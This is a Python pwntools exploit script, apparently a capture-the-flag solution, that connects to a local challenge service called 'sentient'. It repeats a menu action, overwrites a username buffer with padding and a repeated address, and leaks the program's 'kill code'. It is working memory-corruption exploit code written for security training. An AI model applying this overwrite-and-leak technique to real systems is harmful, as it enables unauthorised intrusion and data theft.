#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

context.binary = 'sentient'

killcode_addr = context.binary.symbols.data


def exploit():
    r = remote('localhost', 1337)
    r.sendlineafter('username: ', 'username')

    log.info("Starting")
    r.recvuntil('Available actions')

    # 28 tries give 95% success rate
    torpedoes = 28
    p = log.progress("Firing torpedoes")
    for i in range(torpedoes):
        p.status("%s / %s" % (i, torpedoes))

        r.sendlineafter('Choice: ', '2')
        r.sendlineafter('(y/n) ', 'y')
    p.success()

    names = 16
    p = log.progress("Overwriting username")
    for i in range(names):
        p.status("%s / %s" % (i, names))

        r.sendlineafter('Choice: ', '1')
        r.sendlineafter('message: ', 'A'*6 + p64(killcode_addr)*32)
    p.success()

    log.info("Leaking kill code")
    r.sendlineafter('Choice: ', '1')
    r.sendlineafter('message: ', 'A')
    r.recvuntil('but you "')
    code = r.recvuntil('" are first', drop=True)
    log.success("Code: %s", code)

    r.close()


if __name__ == '__main__':
    exploit()
